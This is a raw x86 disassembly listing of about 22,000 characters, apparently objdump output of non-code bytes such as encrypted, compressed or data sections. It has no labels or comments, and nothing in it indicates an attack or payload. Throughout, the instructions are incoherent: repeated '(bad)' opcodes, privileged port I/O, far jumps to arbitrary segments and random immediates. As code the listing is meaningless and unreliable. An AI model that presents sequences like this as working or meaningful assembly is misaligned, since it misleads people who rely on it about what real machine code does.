  42182b:	mov    ch,BYTE PTR [esi+0x76]
  42182e:	outs   dx,DWORD PTR ds:[esi]
  42182f:	or     al,0x54
  421831:	sbb    DWORD PTR [edx+0x5a2e491],0x6c
  421838:	fs in  al,0xe0
  42183b:	out    dx,al
  42183c:	adc    edi,ebp
  42183e:	test   esp,esi
  421840:	dec    esp
  421841:	loopne 0x421851
  421843:	cdq    
  421844:	adc    DWORD PTR [ebp+0x3a],0x487aa3d4
  42184b:	or     eax,0x6252bb02
  421850:	ss pop es
  421852:	and    dh,BYTE PTR [eax]
  421854:	int3   
  421855:	icebp  
  421856:	xor    edi,esp
  421858:	mov    al,BYTE PTR [ebx]
  42185a:	or     BYTE PTR [eax+0x59],dh
  42185d:	mov    edx,0x469e1216
  421862:	fidiv  WORD PTR [esi-0x6a]
  421865:	loopne 0x421806
  421867:	and    cl,al
  421869:	push   esi
  42186a:	adc    bh,ch
  42186c:	inc    eax
  42186d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42186e:	ins    BYTE PTR es:[edi],dx
  42186f:	jmp    0xb6a8:0x37841a20
  421876:	sbb    BYTE PTR [ebx],dl
  421878:	cmp    al,0xab
  42187a:	jle    0x421837
  42187c:	fwait
  42187d:	jne    0x4218c4
  42187f:	sub    eax,0xd5593fae
  421884:	pop    esp
  421885:	adc    al,0x43
  421887:	cmp    DWORD PTR [edx-0x10009561],0xe7b4ef6f
  421891:	add    ebx,DWORD PTR [ebx]
  421893:	popa   
  421894:	adc    eax,0x66099cc7
  421899:	xor    eax,0x7fc31923
  42189e:	popf   
  42189f:	dec    ebx
  4218a0:	aas    
  4218a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218a2:	sub    eax,0x44039168
  4218a7:	xlat   BYTE PTR ds:[ebx]
  4218a8:	adc    eax,0xfd85aee1
  4218ad:	std    
  4218ae:	push   esi
  4218af:	xchg   ecx,eax
  4218b0:	mov    ds:0x98873025,eax
  4218b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218b6:	ja     0x42184a
  4218b8:	(bad)  [ebx+0x1a0d79da]
  4218be:	std    
  4218bf:	jp     0x421860
  4218c1:	retf   
  4218c2:	or     al,0xb0
  4218c4:	xor    ah,BYTE PTR es:[esi-0x72]
  4218c8:	adc    ah,BYTE PTR es:[edx+0x1b45a0d3]
  4218cf:	jae    0x421933
  4218d1:	jmp    0x6ed5:0xa9da11f
  4218d8:	retf   
  4218d9:	adc    ah,BYTE PTR [ecx]
  4218db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218dc:	(bad)  
  4218de:	jp     0x421937
  4218e0:	call   0xd797:0x2c1d444e
  4218e7:	jg     0x4218da
  4218e9:	mov    ecx,0x24024f92
  4218ee:	xor    al,0x50
  4218f0:	test   DWORD PTR [eax-0x5c],eax
  4218f3:	jno    0x42187f
  4218f5:	jne    0x42193d
  4218f7:	fild   WORD PTR [ebp+0x3ae8be47]
  4218fd:	xor    DWORD PTR [esi],esp
  4218ff:	aas    
  421900:	jp     0x421920
  421902:	fmul   st,st(7)
  421904:	fild   DWORD PTR [edi+0x738b005f]
  42190a:	pop    edi
  42190b:	jg     0x4218ee
  42190d:	and    al,0x7b
  42190f:	out    0x5f,al
  421911:	mov    WORD PTR [edi],?
  421913:	out    dx,eax
  421914:	mov    esp,0x7bb39fc5
  421919:	mov    esp,0x60fb2ff7
  42191e:	dec    ebx
  42191f:	jo     0x421962
  421921:	stos   WORD PTR es:[edi],ax
  421923:	inc    esp
  421924:	pop    eax
  421925:	mov    ebx,0xfb593901
  42192a:	neg    cl
  42192c:	xlat   BYTE PTR ds:[ebx]
  42192d:	fmul   st(4),st
  42192f:	mov    BYTE PTR [esi+eiz*4+0x14a9a4c8],0x58
  421937:	aas    
  421938:	lods   al,BYTE PTR ds:[esi]
  421939:	mov    ds:0x2d378217,eax
  42193e:	in     eax,0xff
  421940:	retf   
  421941:	jp     0x421993
  421943:	xchg   ebx,eax
  421944:	lods   al,BYTE PTR ds:[esi]
  421945:	mov    ds:0xa03df02c,eax
  42194a:	mov    esp,0xc97be3d6
  42194f:	scas   eax,DWORD PTR es:[edi]
  421950:	retf   0xc288
  421953:	stos   DWORD PTR es:[edi],eax
  421954:	arpl   WORD PTR [ecx-0x1c],bp
  421957:	daa    
  421958:	outs   dx,BYTE PTR ds:[esi]
  421959:	push   ecx
  42195a:	fs mov dl,0x9f
  42195d:	cmp    edi,DWORD PTR ds:0x81ead2de
  421963:	jo     0x421982
  421965:	pop    ebx
  421966:	and    eax,0x98537c9
  42196b:	xchg   ebp,eax
  42196c:	hlt    
  42196d:	or     DWORD PTR [ebp-0x37dc3ad0],edx
  421973:	scas   eax,DWORD PTR es:[edi]
  421974:	js     0x421915
  421976:	retf   
  421977:	sti    
  421978:	jo     0x421958
  42197a:	jmp    0x47b3f43a
  42197f:	or     bh,BYTE PTR [ebx+0x4f]
  421982:	shr    DWORD PTR [eax],0xfc
  421985:	add    al,0x28
  421987:	jmp    0x4a5e:0xd7c72ced
  42198e:	inc    esp
  42198f:	dec    esi
  421990:	add    bh,BYTE PTR [ebp-0x77138844]
  421996:	ds jge 0x4219ba
  421999:	cmp    ebx,ecx
  42199b:	add    BYTE PTR [edx+edi*1],ch
  42199e:	or     esp,eax
  4219a0:	adc    eax,0xf95b717f
  4219a5:	lahf   
  4219a6:	mov    cl,dl
  4219a8:	out    dx,eax
  4219a9:	stos   BYTE PTR es:[edi],al
  4219aa:	and    ebp,DWORD PTR [ebx-0x30]
  4219ad:	sub    edx,DWORD PTR [edx+0x47760ad0]
  4219b3:	adc    al,0x3e
  4219b5:	aam    0x67
  4219b7:	sahf   
  4219b8:	retf   
  4219b9:	dec    BYTE PTR ds:0x3ddba0ca
  4219bf:	push   ss
  4219c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4219c1:	xchg   esi,eax
  4219c2:	mov    bl,0xbd
  4219c4:	adc    ah,dh
  4219c6:	inc    esi
  4219c7:	les    edx,FWORD PTR [edi-0x76c96517]
  4219cd:	je     0x421981
  4219cf:	cmp    ebx,DWORD PTR [ebx+0x60]
  4219d2:	mov    ah,0xeb
  4219d4:	(bad)  
  4219d5:	adc    eax,DWORD PTR [edi+0x56de641c]
  4219db:	test   eax,0xc7ff5136
  4219e0:	fnstcw WORD PTR [esi-0x61]
  4219e3:	cli    
  4219e4:	push   ebx
  4219e5:	scas   al,BYTE PTR es:[edi]
  4219e6:	mov    ecx,0xaa6645b2
  4219eb:	clc    
  4219ec:	xchg   DWORD PTR [edx-0x2b48ea60],edx
  4219f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219f3:	sbb    eax,0x52c0e233
  4219f8:	leave  
  4219f9:	jno    0x421989
  4219fb:	mov    esp,0x33c0a3d9
  421a00:	lds    ebp,FWORD PTR [esi-0x71f29980]
  421a06:	jp     0x4219b3
  421a08:	push   ss
  421a09:	cmp    ecx,ebp
  421a0b:	adc    eax,0xefbf92ba
  421a10:	jnp    0x4219f1
  421a12:	repz call FWORD PTR [esi+0x4f]
  421a16:	cmc    
  421a17:	cmc    
  421a18:	fnstsw ax
  421a1a:	cmp    al,0xa7
  421a1c:	rol    BYTE PTR [esi-0x1f35ac91],0x55
  421a23:	cld    
  421a24:	leave  
  421a25:	mov    al,0xa3
  421a27:	inc    di
  421a29:	push   ds
  421a2a:	jbe    0x421a92
  421a2c:	adc    cl,ah
  421a2e:	sbb    ax,0x41af
  421a32:	adc    al,0x61
  421a34:	pop    edx
  421a35:	jns    0x421ab6
  421a37:	mov    edi,0xa840dafb
  421a3c:	test   DWORD PTR [edx],0x9de37c8d
  421a42:	add    edi,DWORD PTR [edi-0x5a]
  421a45:	loope  0x421a5b
  421a47:	mov    ds:0x7aaf1c3f,eax
  421a4c:	mov    dh,0x48
  421a4e:	loopne 0x421a79
  421a50:	popa   
  421a51:	ja     0x421a9f
  421a53:	add    dh,0x27
  421a56:	scas   eax,DWORD PTR es:[edi]
  421a57:	out    0x2f,eax
  421a59:	and    DWORD PTR [edx],edx
  421a5b:	xchg   ecx,eax
  421a5c:	clc    
  421a5d:	cmp    ebx,DWORD PTR [eax-0x2dc95953]
  421a63:	xor    BYTE PTR [ebx-0x7ae63d95],cl
  421a69:	mov    dl,cl
  421a6b:	push   edi
  421a6c:	mov    edi,0xcde884f4
  421a71:	jne    0x421ad4
  421a73:	push   esp
  421a74:	icebp  
  421a75:	in     al,dx
  421a76:	scas   al,BYTE PTR es:[edi]
  421a77:	cwde   
  421a78:	push   ebx
  421a79:	or     dh,BYTE PTR [ebx+0x4986d6ba]
  421a7f:	pop    ebp
  421a80:	sub    eax,0x748a8ca1
  421a85:	shl    BYTE PTR [eax+0x37539f5b],1
  421a8b:	stos   DWORD PTR es:[edi],eax
  421a8c:	mov    eax,esi
  421a8e:	popf   
  421a8f:	pop    es
  421a90:	outs   dx,DWORD PTR ds:[esi]
  421a91:	mov    DWORD PTR [edi*2+0xc93c620],esi
  421a98:	cmp    eax,0xccf6cd90
  421a9d:	sub    eax,0x27eafa70
  421aa2:	int3   
  421aa3:	cmp    dh,BYTE PTR [eax]
  421aa5:	stos   DWORD PTR es:[edi],eax
  421aa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421aa7:	pop    edx
  421aa8:	call   0xa2aeb26d
  421aad:	mov    edx,0xf14818ce
  421ab2:	or     BYTE PTR [edx-0x909f246],dh
  421ab8:	cdq    
  421ab9:	push   0x68
  421abb:	in     eax,dx
  421abc:	daa    
  421abd:	shr    BYTE PTR [esi],0x74
  421ac0:	shl    BYTE PTR [ebx+0x2a],0x1
  421ac4:	cli    
  421ac5:	scas   eax,DWORD PTR es:[edi]
  421ac6:	dec    ebx
  421ac7:	add    dh,cl
  421ac9:	lahf   
  421aca:	sub    eax,edx
  421acc:	jp     0x421ab1
  421ace:	jno    0x421a77
  421ad0:	push   ds
  421ad1:	adc    esp,DWORD PTR [ecx+0x6]
  421ad4:	nop
  421ad5:	mov    dl,0x22
  421ad7:	outs   dx,BYTE PTR ds:[esi]
  421ad8:	loope  0x421af5
  421ada:	test   eax,0x1b328790
  421adf:	cdq    
  421ae0:	popa   
  421ae1:	cdq    
  421ae2:	push   ds
  421ae3:	push   cs
  421ae4:	xchg   edi,eax
  421ae5:	jo     0x421aed
  421ae7:	sub    BYTE PTR [edi],ch
  421ae9:	lahf   
  421aea:	and    cl,BYTE PTR [ecx+0x5cc44436]
  421af0:	mov    ebx,ebx
  421af2:	pop    ss
  421af3:	jecxz  0x421b45
  421af5:	sar    DWORD PTR [ebx-0x6c],cl
  421af8:	jo     0x421b16
  421afa:	dec    ecx
  421afb:	repz jno 0x421b04
  421afe:	idiv   BYTE PTR [edx-0x1689535f]
  421b04:	sub    BYTE PTR [ebx+ebx*2+0x5038df28],ah
  421b0b:	pop    ebp
  421b0c:	adc    DWORD PTR [eax],esp
  421b0e:	dec    ebp
  421b0f:	dec    edx
  421b10:	xchg   ecx,eax
  421b11:	shr    BYTE PTR [ecx+0x13],1
  421b14:	ss (bad) 
  421b16:	and    al,0x9b
  421b18:	popa   
  421b19:	add    BYTE PTR [esi],bh
  421b1b:	and    edi,DWORD PTR [edx-0x63]
  421b1e:	in     eax,0xac
  421b20:	and    bl,BYTE PTR [ebx+0x3929b01f]
  421b26:	inc    ebp
  421b27:	adc    ch,BYTE PTR [ecx]
  421b29:	xchg   ebp,eax
  421b2a:	lahf   
  421b2b:	ins    BYTE PTR es:[edi],dx
  421b2c:	call   0x866d:0x12bf96de
  421b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b34:	or     ecx,0xffffffdf
  421b37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421b38:	bound  esi,QWORD PTR [esi-0x73f064e]
  421b3e:	dec    edx
  421b3f:	push   eax
  421b40:	jo     0x421b61
  421b42:	and    ah,BYTE PTR [ecx+0x19c218c1]
  421b48:	inc    ebx
  421b49:	jno    0x421bc9
  421b4b:	jne    0x421b10
  421b4d:	inc    ebp
  421b4e:	mov    ecx,0x71644196
  421b53:	push   0xc58c02cd
  421b58:	adc    eax,0xe61df204
  421b5d:	ror    al,cl
  421b5f:	and    eax,0xbeb61730
  421b64:	sbb    ch,BYTE PTR [esi-0x74945759]
  421b6a:	dec    eax
  421b6b:	add    eax,0x7efcc1f3
  421b70:	lahf   
  421b71:	add    bh,BYTE PTR [esp+eiz*8+0x72]
  421b75:	mov    BYTE PTR [edx],cl
  421b77:	addr16 pop edx
  421b79:	fdivr  st(0),st
  421b7b:	sbb    DWORD PTR [eax-0x1fbee992],edi
  421b81:	lds    ecx,FWORD PTR [ecx]
  421b83:	sbb    edi,DWORD PTR [ebx]
  421b85:	sbb    eax,0x2b5744ba
  421b8a:	sti    
  421b8b:	pusha  
  421b8c:	push   cs
  421b8d:	into   
  421b8e:	mov    bl,0x7
  421b90:	sub    BYTE PTR [edx],0x33
  421b93:	div    BYTE PTR ds:0x4b120cd2
  421b99:	cli    
  421b9a:	mov    eax,esp
  421b9c:	pop    ebx
  421b9d:	jmp    0xbe1b:0x0
  421ba4:	out    dx,al
  421ba5:	call   0xa09a:0xbf7fdaef
  421bac:	or     eax,0x18896377
  421bb1:	imul   esp,DWORD PTR [ebp-0xbfffe6b],0x37000004
  421bbb:	sub    al,BYTE PTR [ebx]
  421bbd:	cmp    al,0x71
  421bbf:	not    DWORD PTR [ebx+0x1a]
  421bc2:	push   edx
  421bc3:	out    dx,eax
  421bc4:	mov    edx,?
  421bc6:	inc    ebp
  421bc7:	or     BYTE PTR [ebp-0x2a65060a],0x3d
  421bce:	imul   BYTE PTR [eax+0x2fcf19fa]
  421bd4:	loope  0x421b7a
  421bd6:	(bad)  
  421bd7:	popa   
  421bd8:	sub    bh,BYTE PTR [edi+eiz*1+0x6f809211]
  421bdf:	retf   
  421be0:	call   0x385aa217
  421be5:	cmp    edx,DWORD PTR [ebx-0x13]
  421be8:	lock ins BYTE PTR es:[edi],dx
  421bea:	or     eax,0x87e947c0
  421bef:	retf   0x408c
  421bf2:	(bad)  
  421bf4:	sahf   
  421bf5:	xor    BYTE PTR [eax+0x1f],ah
  421bf8:	popa   
  421bf9:	int    0xa6
  421bfb:	add    edx,DWORD PTR [ebp+0x47acf7c1]
  421c01:	push   eax
  421c02:	outs   dx,DWORD PTR ds:[esi]
  421c03:	xchg   ecx,eax
  421c04:	(bad)  
  421c06:	inc    ebp
  421c07:	ret    
  421c08:	xor    eax,0xac8951ae
  421c0d:	pop    ecx
  421c0e:	xor    DWORD PTR [esi-0x5e],edi
  421c11:	(bad)  
  421c12:	fbstp  TBYTE PTR [ecx-0x6b]
  421c15:	jg     0x421c96
  421c17:	scas   al,BYTE PTR es:[edi]
  421c18:	jmp    0x421c93
  421c1a:	test   eax,0xecdbcb97
  421c1f:	imul   esi,DWORD PTR [ecx],0xffffff97
  421c22:	pop    esi
  421c23:	adc    BYTE PTR [eax+0x341106f3],bh
  421c29:	push   ecx
  421c2a:	mov    edx,fs
  421c2c:	(bad)  
  421c2e:	test   eax,0x4086170c
  421c33:	inc    edx
  421c34:	mov    DWORD PTR [ecx+0x5],eax
  421c37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c38:	fadd   QWORD PTR ds:0x1239a669
  421c3e:	hlt    
  421c3f:	and    al,0x13
  421c41:	mov    ch,0x5b
  421c43:	mov    BYTE PTR [ecx],al
  421c45:	xchg   ebp,eax
  421c46:	test   eax,0xd785c46d
  421c4b:	rol    DWORD PTR [ecx+edi*2+0x60],0xed
  421c50:	or     al,0x27
  421c52:	and    al,0x32
  421c54:	adc    DWORD PTR ds:0x22c4a04,ecx
  421c5a:	jl     0x421c76
  421c5c:	leave  
  421c5d:	test   BYTE PTR ds:0x2a844dd3,ch
  421c63:	sahf   
  421c64:	lods   al,BYTE PTR ds:[esi]
  421c65:	adc    DWORD PTR [ecx+0x6f],esi
  421c68:	mov    edx,0x118d483
  421c6d:	push   esp
  421c6e:	xchg   ebx,eax
  421c6f:	pop    esp
  421c70:	jae    0x421c2c
  421c72:	push   ebx
  421c73:	out    dx,al
  421c74:	rcl    DWORD PTR [ebp-0x2],0x2f
  421c78:	outs   dx,BYTE PTR ds:[esi]
  421c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c7a:	leave  
  421c7b:	mov    esi,0x3b7c1152
  421c80:	arpl   WORD PTR [eax-0x261c7cfc],dx
  421c86:	push   DWORD PTR [ebp-0x11]
  421c89:	cmp    bh,BYTE PTR [ecx+0x7c]
  421c8c:	imul   edx,edx,0x7aee0272
  421c92:	outs   dx,DWORD PTR ds:[esi]
  421c93:	xor    DWORD PTR [edi],0xffffffbc
  421c96:	fiadd  DWORD PTR [ecx-0x49]
  421c99:	xor    bh,BYTE PTR [edi]
  421c9b:	nop
  421c9c:	ds lock das 
  421c9f:	mov    eax,DWORD PTR gs:[eax]
  421ca2:	sbb    al,0xc3
  421ca4:	dec    ebp
  421ca5:	mov    esi,0xadf60373
  421caa:	push   ss
  421cab:	inc    edx
  421cac:	adc    bh,cl
  421cae:	loopne 0x421cb6
  421cb0:	test   eax,0x5ac60c9d
  421cb5:	mov    al,ds:0x12145a84
  421cba:	jle    0x421ce8
  421cbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cbd:	jle    0x421cf8
  421cbf:	mov    ebp,0x504b270f
  421cc4:	mov    bl,0x6e
  421cc6:	jae    0x421c63
  421cc8:	test   dh,0xc
  421ccb:	fmul   DWORD PTR [eax+0x58849230]
  421cd1:	and    al,0x72
  421cd3:	mov    eax,ds:0x8fe1f1e9
  421cd8:	test   BYTE PTR [eax],cl
  421cda:	test   al,0xbf
  421cdc:	mov    esp,0xc5bb62b6
  421ce1:	loopne 0x421c76
  421ce3:	es aad 0x4c
  421ce6:	in     eax,dx
  421ce7:	mov    eax,ds:0x8194640d
  421cec:	push   ebp
  421cee:	xchg   ebx,eax
  421cef:	outs   dx,BYTE PTR ds:[esi]
  421cf0:	jg     0x421ce0
  421cf2:	sub    al,ah
  421cf4:	ds and cl,ch
  421cf7:	jecxz  0x421d2f
  421cf9:	push   esi
  421cfa:	mov    esp,0x2cd243b3
  421cff:	icebp  
  421d00:	je     0x421cc1
  421d02:	cmp    DWORD PTR [ebx-0x2e],ecx
  421d05:	dec    esp
  421d06:	xchg   edx,eax
  421d07:	jl     0x421c9e
  421d09:	mov    edx,0x752d32e7
  421d0e:	ficom  DWORD PTR [edi]
  421d10:	mov    DWORD PTR [esi],eax
  421d12:	xchg   ecx,eax
  421d13:	aad    0xf4
  421d15:	aad    0x2f
  421d17:	out    dx,eax
  421d18:	out    0x95,eax
  421d1a:	fld    TBYTE PTR [edx+0x7]
  421d1d:	aaa    
  421d1e:	push   0x4c
  421d20:	lock (bad) 
  421d22:	cmp    DWORD PTR [edx-0xed8caf3],0xffffff97
  421d29:	adc    BYTE PTR [ebx+0x3f],0x8e
  421d2d:	or     dl,cl
  421d2f:	fisubr WORD PTR [eax]
  421d31:	out    dx,eax
  421d32:	jge    0x421ce5
  421d34:	retf   0x2b7f
  421d37:	pop    esi
  421d38:	pop    eax
  421d39:	aaa    
  421d3a:	xlat   BYTE PTR ds:[ebx]
  421d3b:	(bad)  
  421d3c:	int3   
  421d3d:	jo     0x765a7b38
  421d43:	mov    dh,BYTE PTR [esi+0x1bbddb44]
  421d49:	sbb    al,0xd7
  421d4b:	cmp    edi,esp
  421d4d:	(bad)  
  421d4f:	sub    BYTE PTR es:[ebp+0x12],ah
  421d53:	fcos   
  421d55:	xchg   edx,eax
  421d56:	xchg   esp,eax
  421d57:	sub    eax,0x2fe2ab63
  421d5c:	xadd   BYTE PTR [eax],bl
  421d5f:	mov    esi,0xa8ade419
  421d64:	in     al,0xdb
  421d66:	mov    esp,0x610d16f7
  421d6b:	retf   
  421d6c:	dec    esp
  421d6d:	sar    DWORD PTR [ebx+0x52798d62],0x8e
  421d74:	adc    DWORD PTR [ebx-0x75],eax
  421d77:	outs   dx,DWORD PTR ds:[esi]
  421d78:	mov    edx,cs
  421d7a:	fs mov bh,0xcc
  421d7d:	xor    eax,0xc01b8cd2
  421d82:	or     bh,BYTE PTR [ebp+0xe]
  421d85:	stc    
  421d86:	fsub   st(5),st
  421d88:	cmp    eax,DWORD PTR [edx]
  421d8a:	pop    esi
  421d8b:	aaa    
  421d8c:	jae    0x421d1b
  421d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d8f:	mov    edx,ebx
  421d91:	shl    DWORD PTR [edi-0x71844b7b],1
  421d97:	mov    bh,0x4b
  421d99:	mov    dl,0x65
  421d9b:	mov    eax,ds:0xe92fd38d
  421da0:	pop    ecx
  421da1:	inc    eax
  421da2:	imul   eax,edi,0x3f
  421da5:	jecxz  0x421dd6
  421da7:	inc    eax
  421da8:	pusha  
  421da9:	pop    ecx
  421daa:	mov    cl,0xff
  421dac:	cli    
  421dad:	sub    al,0xda
  421db0:	mov    al,ds:0x925b8d0
  421db5:	mov    al,ds:0x963fbfe
  421dba:	call   0xbf57:0xc8259482
  421dc1:	push   0xf777c945
  421dc6:	jnp    0x421d4f
  421dc8:	push   ebx
  421dc9:	or     ebp,edi
  421dcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dcc:	xchg   edx,eax
  421dcd:	loope  0x421e2a
  421dcf:	jecxz  0x421dfc
  421dd1:	out    dx,eax
  421dd2:	std    
  421dd3:	and    eax,0x7cabbbb3
  421dd8:	inc    eax
  421dd9:	mov    esp,0x12e7242f
  421dde:	add    DWORD PTR gs:[esi-0x5b6bba6f],edx
  421de5:	inc    eax
  421de6:	cs jmp 0x421e54
  421de9:	not    DWORD PTR [esi+0x849436d]
  421def:	out    0x4d,eax
  421df1:	out    dx,al
  421df2:	xchg   ebp,eax
  421df3:	push   ss
  421df4:	and    eax,0xf7cdb1a0
  421df9:	xchg   edx,eax
  421dfa:	scas   eax,DWORD PTR es:[edi]
  421dfb:	xchg   edx,eax
  421dfc:	outs   dx,DWORD PTR ds:[esi]
  421dfd:	popa   
  421dfe:	push   cs
  421dff:	lock pop edx
  421e01:	add    BYTE PTR [ecx],0x36
  421e04:	aad    0x25
  421e06:	loop   0x421d89
  421e08:	xchg   DWORD PTR [eax+0x4ae827cd],edi
  421e0e:	jge    0x421da5
  421e10:	add    esi,DWORD PTR [eax-0x22c0a196]
  421e16:	xchg   esi,eax
  421e17:	sub    al,0x1d
  421e19:	mov    edx,edi
  421e1b:	sbb    al,0x17
  421e1d:	fimul  DWORD PTR [ecx-0x1fae3279]
  421e23:	push   edx
  421e24:	scas   al,BYTE PTR es:[edi]
  421e25:	adc    eax,0xff8b6c6b
  421e2a:	das    
  421e2b:	xor    eax,0x1483bfc0
  421e30:	sub    dl,BYTE PTR [ebx-0x6cb278aa]
  421e36:	aas    
  421e37:	pop    ds
  421e38:	jns    0x421e65
  421e3a:	vhsubpd xmm4,xmm7,XMMWORD PTR [esp+esi*1]
  421e3f:	jle    0x421e05
  421e41:	dec    ecx
  421e42:	test   BYTE PTR [ebp-0x3987013f],al
  421e48:	adc    eax,0xc6f55a61
  421e4d:	or     BYTE PTR [ebp-0x4c],al
  421e50:	push   ecx
  421e51:	xor    ecx,esi
  421e53:	mov    edi,DWORD PTR [edx+0x1a667ff4]
  421e59:	fistp  DWORD PTR gs:[edi-0x7f2c57a0]
  421e60:	dec    edx
  421e61:	arpl   WORD PTR ds:0x95e49766,cx
  421e67:	out    dx,eax
  421e68:	or     esp,DWORD PTR [ebx-0x66]
  421e6b:	test   al,cl
  421e6d:	inc    ebx
  421e6e:	mov    dh,0x53
  421e70:	js     0x421df7
  421e72:	push   0xb9a3856
  421e77:	mov    BYTE PTR [bx+di+0x3e],ah
  421e7b:	mov    eax,cs:0x252f439f
  421e81:	(bad)  
  421e82:	in     al,dx
  421e83:	mul    DWORD PTR [ebp+0x50fe35ed]
  421e89:	pusha  
  421e8a:	jmp    0x421ee2
  421e8c:	jge    0x421e17
  421e8e:	cmp    DWORD PTR [edx-0x4d],edi
  421e91:	xor    dh,ch
  421e93:	jbe    0x421e7d
  421e95:	push   es
  421e96:	imul   BYTE PTR [edx-0x7]
  421e99:	or     DWORD PTR [esi+0x2e],ebp
  421e9c:	sub    DWORD PTR [esi+0x66],eax
  421e9f:	inc    edi
  421ea0:	lock dec esp
  421ea2:	xchg   esp,eax
  421ea3:	std    
  421ea4:	shl    DWORD PTR [eax-0x4700cb13],cl
  421eaa:	(bad)  
  421eab:	sub    BYTE PTR ds:0x5a998ee2,cl
  421eb1:	add    DWORD PTR [ecx-0x6d],esi
  421eb4:	jbe    0x421e9f
  421eb6:	std    
  421eb7:	push   cs
  421eb8:	shr    bh,cl
  421eba:	add    eax,DWORD PTR [edi+0x6e7c3d7a]
  421ec0:	push   DWORD PTR [edi+0x30bc4c38]
  421ec6:	mov    dl,0x3a
  421ec8:	out    0x72,eax
  421eca:	loopne 0x421f22
  421ecc:	mov    al,ds:0x1e34ae60
  421ed1:	dec    ebx
  421ed2:	nop
  421ed3:	sub    eax,0x1dcfc033
  421ed8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ed9:	inc    ebx
  421eda:	cmp    eax,DWORD PTR [ebx+0x2f]
  421edd:	adc    eax,0x177f0155
  421ee2:	retf   
  421ee3:	sub    eax,0x70fc074c
  421ee8:	pop    esp
  421ee9:	mov    BYTE PTR [esi],ah
  421eeb:	hlt    
  421eec:	scas   eax,DWORD PTR es:[edi]
  421eed:	stos   DWORD PTR es:[edi],eax
  421eee:	retf   0x908f
  421ef1:	inc    eax
  421ef2:	push   esp
  421ef3:	fsubr  st(5),st
  421ef5:	pop    edx
  421ef6:	leave  
  421ef7:	add    al,0x8
  421ef9:	xor    al,0x98
  421efb:	arpl   WORD PTR [esi-0x76b62c41],di
  421f01:	pop    esp
  421f02:	xor    ecx,0xab4e8138
  421f08:	xchg   ebx,eax
  421f09:	pusha  
  421f0a:	push   ecx
  421f0b:	pop    ecx
  421f0c:	pop    edx
  421f0d:	push   0x26
  421f0f:	fs push eax
  421f11:	ret    
  421f12:	push   eax
  421f13:	mov    edi,0x1c17aaea
  421f18:	xor    BYTE PTR [ebx+0x2c],ah
  421f1b:	adc    cl,BYTE PTR [ebx+ebp*8+0x3fba2768]
  421f22:	out    0x2d,al
  421f24:	mov    edi,0x608a8634
  421f29:	push   0xb7ad6d88
  421f2e:	outs   dx,DWORD PTR ds:[esi]
  421f2f:	jmp    DWORD PTR [eax]
  421f31:	jb     0x421f82
  421f33:	mov    eax,DWORD PTR [ecx]
  421f35:	lahf   
  421f36:	adc    eax,DWORD PTR [edi-0x23]
  421f39:	sub    BYTE PTR [ebx],0x61
  421f3c:	mov    ah,0x6c
  421f3e:	scas   al,BYTE PTR es:[edi]
  421f3f:	jb     0x421f75
  421f41:	repnz add cl,BYTE PTR [edi]
  421f44:	ds mov esi,edi
  421f47:	push   ds
  421f48:	inc    esi
  421f49:	clc    
  421f4a:	jmp    0x421f32
  421f4c:	inc    eax
  421f4d:	imul   esp,DWORD PTR [ecx+0x70],0x5d3009ba
  421f54:	sbb    ebp,DWORD PTR [ebx]
  421f56:	fwait
  421f57:	pop    esi
  421f58:	xor    eax,0xf830403f
  421f5d:	inc    esp
  421f5e:	xchg   DWORD PTR [edi],eax
  421f60:	mov    WORD PTR [edi+0x61],gs
  421f63:	push   es
  421f64:	int    0x51
  421f66:	jmp    0x67aa:0x45e43ec3
  421f6d:	xchg   BYTE PTR [edx+0x5d582ea4],dl
  421f73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f74:	cmp    DWORD PTR [eax+0x2a66612a],eax
  421f7a:	add    dh,dl
  421f7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f7d:	xor    al,0xe4
  421f7f:	push   esi
  421f80:	cmp    dh,BYTE PTR [edx+0x58481985]
  421f86:	add    al,0xfe
  421f88:	adc    al,ch
  421f8a:	imul   edi,ecx,0x76
  421f8d:	push   ebp
  421f8e:	xchg   esp,eax
  421f8f:	outs   dx,BYTE PTR ds:[esi]
  421f90:	jp     0x421f65
  421f92:	pop    eax
  421f93:	push   edi
  421f94:	sub    al,0xb9
  421f96:	sahf   
  421f97:	mov    ebp,DWORD PTR [eax]
  421f99:	xchg   ecx,eax
  421f9a:	popa   
  421f9b:	push   ds
  421f9c:	int3   
  421f9d:	pop    eax
  421f9e:	imul   eax,edi,0x0
  421fa1:	data16 outs dx,BYTE PTR ds:[esi]
  421fa3:	adc    eax,0x7b8d04ad
  421fa8:	mov    ah,0x57
  421faa:	jbe    0x421f84
  421fac:	gs push ebx
  421fae:	xchg   ebx,eax
  421faf:	dec    esi
  421fb0:	inc    ebx
  421fb1:	scas   al,BYTE PTR es:[edi]
  421fb2:	into   
  421fb3:	ror    al,0xa4
  421fb6:	xor    ecx,DWORD PTR ds:0xc9593f2
  421fbc:	mov    ecx,0xeaba2650
  421fc1:	pusha  
  421fc2:	jl     0x422036
  421fc4:	je     0x421fa5
  421fc6:	push   esp
  421fc7:	sub    eax,0x6f26de1d
  421fcc:	sahf   
  421fcd:	fmul   DWORD PTR [edi+0x1]
  421fd0:	out    0x13,eax
  421fd2:	bound  esi,QWORD PTR [eax-0x73]
  421fd5:	inc    ecx
  421fd6:	sub    eax,0x77f34686
  421fdb:	outs   dx,DWORD PTR ds:[esi]
  421fdc:	jle    0x421fc5
  421fde:	mov    es,WORD PTR [ecx+0x23]
  421fe1:	xlat   BYTE PTR ds:[ebx]
  421fe2:	mov    BYTE PTR [edi+eax*4+0x65],ah
  421fe6:	push   es
